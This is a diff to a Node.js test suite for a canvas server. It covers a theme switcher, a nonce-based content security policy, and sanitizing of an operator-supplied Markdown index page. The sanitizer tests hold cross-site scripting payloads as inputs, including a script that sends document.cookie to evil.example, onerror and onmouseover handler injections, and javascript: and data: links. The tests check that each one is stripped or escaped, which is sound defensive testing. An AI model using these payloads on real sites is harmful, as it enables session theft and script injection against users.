@@ -1,4 +1,7 @@
 import assert from "node:assert/strict";
+import { mkdtemp, rm, utimes, writeFile } from "node:fs/promises";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
 import { after, before, describe, it } from "node:test";
 
 import { payloadGraph } from "@coldtea/pr-lens-schema/examples";
@@ -428,9 +431,47 @@ describe("the pages and the pictures", () => {
     assert.equal(response.status, 200);
     assert.match(response.headers.get("content-type") ?? "", /text\/html/);
     assert.match(html, /<h1>/);
-    // Nothing off this origin, and no script at all.
-    assert.doesNotMatch(html, /<script/i);
+    // Nothing off this origin: the only script is inline, with no src to fetch.
+    assert.doesNotMatch(html, /<script[^>]*\ssrc=/i);
     assert.doesNotMatch(html, /https?:\/\/(?!127\.0\.0\.1)/);
+  });
+
+  it("carries the theme switcher, and the state it needs to survive a reload", async () => {
+    const html = await (await fetch(`${harness.url}/c/${id}`)).text();
+
+    // One of three, and the picture's media query is what a choice overrides,
+    // since a chosen theme does not move the browser's own preference.
+    for (const choice of ["light", "dark", "auto"])
+      assert.match(html, new RegExp(`data-theme-choice="${choice}"`), choice);
+    assert.match(html, /role="radiogroup"/);
+    assert.match(html, /localStorage\.setItem/);
+    assert.match(html, /prefers-color-scheme: dark/);
+
+    // The attribute lands in <head>, before anything is painted.
+    const head = html.slice(0, html.indexOf("</head>"));
+    assert.match(head, /<script nonce=/, "a reader who chose dark must not see a flash");
+    assert.match(head, /dataset\.theme/);
+  });
+
+  it("touches only the pictures this server drew", async () => {
+    const html = await (await fetch(`${harness.url}/c/${id}`)).text();
+
+    // A mounted index page may hold pictures with art-direction queries of its
+    // own, and the theme script has no business rewriting those.
+    assert.match(html, /<source [^>]*data-theme-dark>/);
+    assert.match(html, /querySelectorAll\("source\[data-theme-dark\]"\)/);
+  });
+
+  it("runs its own script by nonce, and nothing else at all", async () => {
+    const response = await fetch(`${harness.url}/c/${id}`);
+    const html = await response.text();
+    const policy = response.headers.get("content-security-policy") ?? "";
+
+    const nonce = /<script nonce="([^"]+)"/.exec(html)?.[1];
+    assert.ok(nonce !== undefined, "the page signs its own script");
+    assert.match(policy, new RegExp(`script-src 'nonce-${nonce.replace(/[+/=]/g, "\\$&")}'`));
+    assert.match(policy, /default-src 'none'/);
+    assert.doesNotMatch(policy, /unsafe-inline[^;]*script|script[^;]*unsafe-inline/);
   });
 
   it("serves the hero as an SVG at /c/{id}.svg, with its render as the etag", async () => {
@@ -492,7 +533,11 @@ describe("the index page", () => {
     assert.equal(response.status, 200);
     assert.match(response.headers.get("content-type") ?? "", /text\/html/);
     assert.match(html, /PR Lens canvas server/);
-    assert.doesNotMatch(html, /<script/i);
+    assert.doesNotMatch(html, /<script[^>]*\ssrc=/i);
+    // The same switcher, reading the same key, so a choice made on a canvas page
+    // is still in force here.
+    assert.match(html, /data-theme-choice="auto"/);
+    assert.match(html, /"pr-lens-theme"/);
   });
 
   it("shows how to redirect the skill and the CLI at this host", async () => {
@@ -578,5 +623,184 @@ describe("the index page", () => {
     } finally {
       await quiet.close();
     }
+  });
+});
+
+/**
+ * The page at `/`, replaced by one the operator wrote.
+ *
+ * The file is the interface, because in Kubernetes a page of prose is a
+ * ConfigMap and a ConfigMap is a mounted file. So these tests write files and
+ * edit them under a running server, which is what `kubectl edit configmap` does
+ * to a pod.
+ */
+describe("a mounted index page", () => {
+  let dir: string;
+  let file: string;
+  let harness: Harness;
+
+  const write = async (markdown: string): Promise<void> => {
+    await writeFile(file, markdown, "utf8");
+    // mtime is the whole cache key, and two writes can land in the same
+    // millisecond on a filesystem with a coarse clock.
+    const ahead = new Date(Date.now() + 10_000);
+    await utimes(file, ahead, ahead);
+  };
+
+  before(async () => {
+    dir = await mkdtemp(join(tmpdir(), "pr-lens-index-"));
+    file = join(dir, "index.md");
+    await write("# Platform canvases\n\nAsk in `#platform-eng`.\n");
+    harness = await start({ LOG_REQUESTS: "false", INDEX_MARKDOWN_FILE: file });
+  });
+  after(async () => {
+    await harness.close();
+    await rm(dir, { recursive: true, force: true });
+  });
+
+  it("serves the operator's page instead of this server's", async () => {
+    const response = await fetch(harness.url + "/");
+    const html = await response.text();
+
+    assert.equal(response.status, 200);
+    assert.match(response.headers.get("content-type") ?? "", /text\/html/);
+    assert.match(html, /<h1>Platform canvases<\/h1>/);
+    assert.match(html, /<code>#platform-eng<\/code>/);
+    // The heading names the page, since Markdown cannot say <title> itself.
+    assert.match(html, /<title>Platform canvases<\/title>/);
+    // And the default page is gone, not merely pushed down.
+    assert.doesNotMatch(html, /instead of prlens\.dev/);
+  });
+
+  it("keeps the shell, so the theme switcher still works there", async () => {
+    const html = await (await fetch(harness.url + "/")).text();
+    assert.match(html, /data-theme-choice="auto"/);
+    assert.match(html, /"pr-lens-theme"/);
+  });
+
+  it("fills in what the operator cannot know when writing the file", async () => {
+    await write(
+      "# Ours\n\n```sh\nexport PR_LENS_API_URL={{origin}}\n```\n\nstore {{store}}, {{canvases}}, v{{version}}.\n",
+    );
+    const html = await (await fetch(harness.url + "/")).text();
+
+    assert.match(html, new RegExp(`export PR_LENS_API_URL=${harness.url}`));
+    assert.match(html, /store memory, none yet, v\d+\.\d+\.\d+\./);
+  });
+
+  it("follows the file when it changes, with no restart", async () => {
+    await write("# Edited\n\nsecond thoughts.\n");
+    const html = await (await fetch(harness.url + "/")).text();
+
+    assert.match(html, /<h1>Edited<\/h1>/);
+    assert.match(html, /second thoughts/);
+  });
+
+  it("serves the last copy it read when the file goes missing", async () => {
+    await write("# Still here\n");
+    assert.match(await (await fetch(harness.url + "/")).text(), /Still here/);
+
+    await rm(file);
+    const response = await fetch(harness.url + "/");
+
+    assert.equal(response.status, 200, "an index page is not worth a 500");
+    assert.match(await response.text(), /Still here/);
+    await write("# Still here\n");
+  });
+
+  it("drops anything in the file that could execute", async () => {
+    await write(
+      [
+        "# Ours",
+        "",
+        "<script>fetch('https://evil.example/' + document.cookie)</script>",
+        "",
+        '<img src="x" onerror="alert(1)">',
+        "",
+        '<iframe src="https://evil.example"></iframe>',
+        "",
+        "[a link](javascript:alert(1))",
+        "",
+        "<p>but the prose survives</p>",
+        "",
+        '<details><summary>and so does <b>this</b></summary>kept</details>',
+      ].join("\n"),
+    );
+    const html = await (await fetch(harness.url + "/")).text();
+    // The operator's part of the page only: the shell's own script sits after it.
+    const body = html.slice(
+      html.indexOf('class="narrow prose"'),
+      html.indexOf("</main>"),
+    );
+
+    assert.doesNotMatch(body, /<script/i, "a script in the file is gone");
+    assert.doesNotMatch(body, /evil\.example/, "and so is what it was going to do");
+    assert.doesNotMatch(body, /onerror/i);
+    assert.doesNotMatch(body, /<iframe/i);
+    assert.doesNotMatch(body, /javascript:/i);
+
+    // The HTML that cannot execute is left exactly as it was written.
+    assert.match(body, /<p>but the prose survives<\/p>/);
+    assert.match(body, /<details><summary>and so does <b>this<\/b><\/summary>kept<\/details>/);
+    assert.match(body, /<img src="x">/, "the element stays, the handler does not");
+    assert.match(body, /a link/, "the link's words stay, the scheme does not");
+  });
+
+  it("cannot get out of an attribute, or in through an alt", async () => {
+    await write(
+      [
+        "# Ours",
+        "",
+        '[a](<https://a" onmouseover="alert(1)>)',
+        "",
+        "![<img src=x onerror=alert(1)>](https://pictures.example/a.png)",
+        "",
+        "![<img src=x onerror=alert(1)>](javascript:alert(1))",
+        "",
+        "[data](data:text/html,<b>hi</b>)",
+        "",
+        '<a href="data:text/html,hello">raw data</a>',
+      ].join("\n"),
+    );
+    const body = (await (await fetch(harness.url + "/")).text()).slice(0, -1);
+
+    // A quote in a URL or a title is escaped, so what looks like an attribute
+    // stays inside the one it was written in rather than becoming one.
+    assert.doesNotMatch(body, /onmouseover="/);
+    assert.match(body, /href="https:\/\/a&quot; onmouseover=&quot;alert\(1\)"/);
+    // Alt text is text, on the branch that keeps the image and the one that
+    // drops it: neither may put an element on the page.
+    assert.doesNotMatch(body, /<img src=x/);
+    assert.match(body, /alt="&lt;img src=x onerror=alert\(1\)&gt;"/);
+    // data:text/html is a document of somebody else's, under its own policy
+    // rather than this page's, so nothing navigates to one.
+    assert.doesNotMatch(body, /href="data:/);
+  });
+
+  it("titles the page from the document, not from a line that looks like one", async () => {
+    await write(
+      "```\n# Not the title\n```\n\nThe **real** title\n==================\n",
+    );
+    const html = await (await fetch(harness.url + "/")).text();
+
+    assert.match(html, /<title>The real title<\/title>/);
+  });
+
+  it("could not run one anyway, since the policy names only this server's", async () => {
+    await write("# Ours\n\n<script>alert(1)</script>\n");
+    const response = await fetch(harness.url + "/");
+    const policy = response.headers.get("content-security-policy") ?? "";
+    const nonce = /<script nonce="([^"]+)"/.exec(await response.text())?.[1];
+
+    assert.ok(nonce !== undefined);
+    assert.match(policy, new RegExp(`script-src 'nonce-${nonce.replace(/[+/=]/g, "\\$&")}'`));
+    // Somebody else's page may show somebody else's pictures, which is not the
+    // same freedom as running somebody else's code.
+    assert.match(policy, /img-src \* data:/);
+  });
+
+  it("refuses to start when the file was never there", async () => {
+    const { customIndex } = await import("../src/markdown.ts");
+    await assert.rejects(customIndex(join(dir, "absent.md")).warm());
   });
 });
